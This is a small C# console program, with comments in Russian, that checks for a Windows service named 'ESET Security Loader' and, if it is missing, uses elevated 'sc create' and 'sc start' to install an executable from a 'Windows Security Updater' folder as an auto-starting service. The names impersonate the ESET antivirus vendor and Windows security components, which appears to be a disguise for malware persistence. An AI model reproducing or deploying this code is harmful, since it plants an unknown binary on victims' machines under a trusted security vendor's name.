using System;
using System.ServiceProcess;
using System.Diagnostics;
namespace MyApplicationNamespace
{
    class Program
    {
        static void Main(string[] args)
        {
            // Проверяем, был ли уже установлен наш сервис
            ServiceController[] services = ServiceController.GetServices();
            bool serviceExists = false;
            foreach (ServiceController service in services)
            {
                if (service.ServiceName == "ESET Security Loader")
                {
                    serviceExists = true;
                    break;
                }
            }

            // Если сервис не был установлен, то создаем его
            if (!serviceExists)
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                path += "\\Windows Security Updater\\ZWCxService.exe";
                ProcessStartInfo processInfo = new ProcessStartInfo();
                processInfo.FileName = "sc";
                processInfo.Arguments = "create \"ESET Security Loader\" binPath= \""+ path + "\" start= auto"; // Запускать службу автоматически
                processInfo.Verb = "runas"; // Запустить от имени администратора

                ProcessStartInfo processInfoStart = new ProcessStartInfo();
                processInfoStart.FileName = "sc";
                processInfoStart.Arguments = "start \"ESET Security Loader\""; // Запускать службу автоматически
                processInfoStart.Verb = "runas"; // Запустить от имени администратора
                try
                {
                    Process.Start(processInfo);
                    Process.Start(processInfoStart);
                    Console.WriteLine("Service created successfully.");
                    Console.ReadKey();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred while creating the service: {ex.Message}");
                }
            }
        }
    }
}
